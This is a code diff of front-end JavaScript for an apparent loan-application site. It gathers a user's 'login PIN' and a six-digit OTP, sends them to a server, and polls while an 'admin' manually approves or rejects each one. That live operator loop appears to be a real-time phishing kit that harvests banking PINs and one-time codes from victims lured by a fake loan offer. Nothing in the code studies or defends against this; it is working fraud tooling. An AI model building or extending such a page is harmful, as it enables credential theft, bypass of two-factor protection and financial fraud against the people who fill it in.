@@ -244,4 +244,205 @@ function startPinPolling() {
       if (data.status === 'approved') {
         clearInterval(window._pinInterval);
         pinPollingActive = false;
-        clearLoginPin
+        clearLoginPin();
+        document.getElementById('pinAttemptsDisplay').textContent = '🔑 Attempts remaining: 3 of 3';
+        goTo('page-otp');
+        return;
+      }
+      if (data.status === 'rejected') {
+        const remaining = data.remainingAttempts;
+        document.getElementById('pinAttemptsDisplay').textContent = `🔑 Attempts remaining: ${remaining} of 3`;
+        showError('pinErr', `Wrong PIN. ${remaining} attempt(s) remaining.`);
+        clearLoginPin();
+        // STOP polling — user must re-submit a new PIN
+        clearInterval(window._pinInterval);
+        pinPollingActive = false;
+        return;
+      }
+      if (data.status === 'blocked') {
+        clearInterval(window._pinInterval);
+        pinPollingActive = false;
+        document.getElementById('pinAttemptsDisplay').textContent = '🔒 Too many attempts. Please wait 5 minutes.';
+        disablePinInputs();
+        showError('pinErr', 'Application blocked. Please wait 5 minutes.');
+        return;
+      }
+    } catch (err) {
+      console.error('Pin polling error:', err);
+    }
+  }, 3000);
+}
+
+// ─── OTP Submission ───
+async function doOtp() {
+  let otp = '';
+  for (let i = 0; i < 6; i++) otp += document.getElementById('otp' + i).value;
+  if (otp.length !== 6) { showError('otpErr', 'Enter a 6-digit OTP.'); return; }
+
+  try {
+    const response = await fetch('/api/send-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: appData.applicationId, otp })
+    });
+    const data = await response.json();
+    if (data.ok) {
+      startOtpPolling();
+    } else {
+      showError('otpErr', data.error || 'Error');
+    }
+  } catch (err) {
+    alert('Network error');
+  }
+}
+
+// ─── OTP Polling ───
+function startOtpPolling() {
+  if (window._otpInterval) clearInterval(window._otpInterval);
+  window._otpInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status/${appData.applicationId}/otp`, { cache: 'no-store' });
+      if (res.status === 404) {
+        clearInterval(window._otpInterval);
+        clearState();
+        alert('Application not found. Please start again.');
+        goTo('page-landing');
+        return;
+      }
+      const data = await res.json();
+
+      if (data.status === 'approved') {
+        clearInterval(window._otpInterval);
+        showApproval();
+        return;
+      }
+      if (data.status === 'rejected') {
+        clearInterval(window._otpInterval);
+        showRejected('OTP rejected. Please request a new OTP.');
+        return;
+      }
+    } catch (err) {
+      console.error('OTP polling error:', err);
+    }
+  }, 3000);
+}
+
+// ─── Resend OTP ───
+async function resendOtp() {
+  try {
+    const response = await fetch('/api/resend-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ applicationId: appData.applicationId })
+    });
+    const data = await response.json();
+    if (data.ok) {
+      alert('OTP resend request sent to admin.');
+      startOtpPolling();
+    } else {
+      alert('Error: ' + data.error);
+    }
+  } catch (err) {
+    alert('Network error');
+  }
+}
+
+// ─── Resend current step (PIN or OTP) ───
+async function requestResend(step) {
+  try {
+    const res = await fetch(`/api/resend-step/${appData.applicationId}/${step}`, { method: 'POST' });
+    const data = await res.json();
+    if (data.ok) alert('Request sent to admin to resend.');
+    else alert('Error: ' + (data.error || 'Unknown error'));
+  } catch (err) {
+    alert('Network error');
+  }
+}
+
+// ─── Approval / Rejection ───
+function showApproval() {
+  document.getElementById('aprAmount').textContent = `$${appData.loanAmount}`;
+  document.getElementById('aprAmt').textContent = `$${appData.loanAmount}`;
+  document.getElementById('aprTerm').textContent = `${appData.loanDuration} Days`;
+  document.getElementById('aprMth').textContent = `$${(appData.loanAmount * (1 + 0.005 * appData.loanDuration)).toFixed(2)}`;
+  goTo('page-approval');
+  clearState();
+}
+
+function showRejected(reason) {
+  alert(reason);
+  clearState();
+  goTo('page-landing');
+}
+
+// ─── Helpers ───
+function showError(id, msg) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  const txt = el.querySelector('span:last-child');
+  if (txt) txt.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 3000);
+}
+
+function normalizePhone(id) {
+  let el = document.getElementById(id);
+  el.value = el.value.replace(/\D/g, '').slice(0, 9);
+}
+
+function disablePinInputs() {
+  document.querySelectorAll('.pin-box').forEach(inp => inp.disabled = true);
+}
+
+function pinMvM(input, idx) {
+  if (input.value.length > 0 && idx < 3) {
+    document.getElementById('pin' + (idx + 1)).focus();
+  }
+  if (input.value.length === 0 && idx > 0) {
+    document.getElementById('pin' + (idx - 1)).focus();
+  }
+}
+
+function togPin() {
+  let inputs = document.querySelectorAll('.pin-box');
+  inputs.forEach(inp => inp.type = inp.type === 'password' ? 'text' : 'password');
+}
+
+function clearLoginPin() {
+  document.querySelectorAll('.pin-box').forEach(inp => {
+    inp.value = '';
+    inp.disabled = false;
+  });
+}
+
+function handleOtpInput(input, type) {
+  if (input.value.length > 0 && input.id !== 'otp5') {
+    document.getElementById('otp' + (parseInt(input.id.slice(3)) + 1)).focus();
+  }
+}
+
+function clearOtpCode() {
+  document.querySelectorAll('.otp-box').forEach(inp => inp.value = '');
+}
+
+// ─── Restore State on Page Load ───
+document.addEventListener('DOMContentLoaded', function () {
+  const restored = loadState();
+  if (restored && appData.applicationId) {
+    if (currentPage === 'page-processing') {
+      goTo('page-processing');
+      startAppPolling();
+    } else if (currentPage === 'page-pin') {
+      goTo('page-pin');
+    } else if (currentPage === 'page-otp') {
+      goTo('page-otp');
+      startOtpPolling();
+    } else if (currentPage === 'page-step1' || currentPage === 'page-step2' || currentPage === 'page-step3') {
+      goTo(currentPage);
+    } else {
+      goTo(currentPage);
+    }
+  } else {
+    goTo('page-landing');
+  }
+});
